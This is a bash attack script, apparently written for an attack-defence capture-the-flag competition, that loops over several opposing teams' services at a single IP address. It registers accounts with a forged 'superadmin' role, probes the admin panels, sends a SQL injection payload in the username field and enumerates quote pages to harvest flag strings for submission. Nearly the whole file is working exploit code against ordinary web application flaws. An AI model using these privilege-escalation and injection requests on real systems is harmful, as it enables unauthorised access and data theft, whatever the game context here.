#!/bin/bash

echo "🏴 FLAG HUNTING MISSION - Targeting vulnerable teams"

# Focus on Team 4 (already compromised) and try others
TEAMS=("9004" "9001" "9003" "9005")
BASE_URL="http://54.69.37.82"

for port in "${TEAMS[@]}"; do
    target_url="$BASE_URL:$port"
    team_num=$((port - 9000))
    
    echo ""
    echo "🎯 HUNTING FLAGS ON TEAM $team_num ($target_url)"
    echo "=================================================="
    
    # Try to register as admin and access admin panel
    echo "[*] Attempting to register as superadmin..."
    register_response=$(curl -s -c cookies_$team_num.txt "$target_url/register" \
        -d "username=hacker_$(date +%s)" \
        -d "password=password123" \
        -d "confirm_password=password123" \
        -d "role=superadmin")
    
    # Try to access admin panel
    echo "[*] Attempting to access admin panel..."
    admin_response=$(curl -s -b cookies_$team_num.txt "$target_url/admin")
    
    # Look for flags in admin response
    if echo "$admin_response" | grep -q "FLAG"; then
        echo "🚩 POTENTIAL FLAG FOUND IN ADMIN PANEL!"
        echo "$admin_response" | grep -o '\$FLAG\$[a-f0-9]\+' || echo "Flag pattern not exact"
    fi
    
    # Try orgadmin panel
    echo "[*] Attempting to access orgadmin panel..."
    orgadmin_response=$(curl -s -b cookies_$team_num.txt "$target_url/orgadmin")
    
    if echo "$orgadmin_response" | grep -q "FLAG"; then
        echo "🚩 POTENTIAL FLAG FOUND IN ORGADMIN PANEL!"
        echo "$orgadmin_response" | grep -o '\$FLAG\$[a-f0-9]\+'
    fi
    
    # Try SQL injection to extract data
    echo "[*] Attempting SQL injection to extract flags..."
    sql_response=$(curl -s "$target_url/register" \
        -d "username=extract'; SELECT * FROM system_settings; --" \
        -d "password=test" \
        -d "confirm_password=test" \
        -d "role=normal")
    
    # Check for flags in error messages or responses
    if echo "$sql_response" | grep -q "FLAG"; then
        echo "🚩 FLAG FOUND VIA SQL INJECTION!"
        echo "$sql_response" | grep -o '\$FLAG\$[a-f0-9]\+'
    fi
    
    # Try to access quotes that might contain flags
    echo "[*] Checking quotes for flags..."
    for quote_id in {1..10}; do
        quote_response=$(curl -s "$target_url/quote/$quote_id")
        if echo "$quote_response" | grep -q "FLAG"; then
            echo "🚩 FLAG FOUND IN QUOTE $quote_id!"
            echo "$quote_response" | grep -o '\$FLAG\$[a-f0-9]\+'
        fi
    done
    
    # Clean up cookies
    rm -f cookies_$team_num.txt
    
    echo "[✓] Team $team_num scan complete"
done

echo ""
echo "🏆 FLAG HUNTING COMPLETE!"
echo "Submit any found flags at: http://54.69.37.82:1337/"
